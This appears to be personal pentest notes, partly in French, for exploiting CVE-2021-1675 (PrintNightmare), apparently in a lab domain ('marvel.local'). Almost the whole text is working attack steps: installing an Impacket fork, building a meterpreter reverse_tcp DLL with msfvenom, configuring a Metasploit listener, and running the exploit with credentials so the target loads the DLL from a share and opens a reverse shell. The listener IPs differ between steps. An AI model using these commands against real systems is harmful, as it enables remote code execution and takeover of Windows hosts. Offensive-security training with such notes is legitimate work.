CVE-2021-1675

> cube0x0 RCE - https://github.com/cube0x0/CVE-2021-1675  
> calebstewart LPE - https://github.com/calebstewart/CVE-2021-1675  

Install and run Impacket
> pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

> gedit CVE-2021-1675.py

Use msfvenom to create payload :

> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10(monip) LPORT=5555 > shell.dll

> msfconsole
msf5 > use multi/handler
msf5 > exploit (multi/handler) > options
msf5 > exploit (multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf5 > exploit (multi/handler) > set lport 5555
msf5 > exploit (multi/handler) > set LHOST 10.10.14.101
msf5 > exploit (multi/handler) > run

Derrière on va ouvrir une session comme si on se connectait au Share :

> python3 CVE-2021-1675.py marvel.local/fcastle:Password123@IPdelacible '\\IPduFILEshare\share\shell.dll



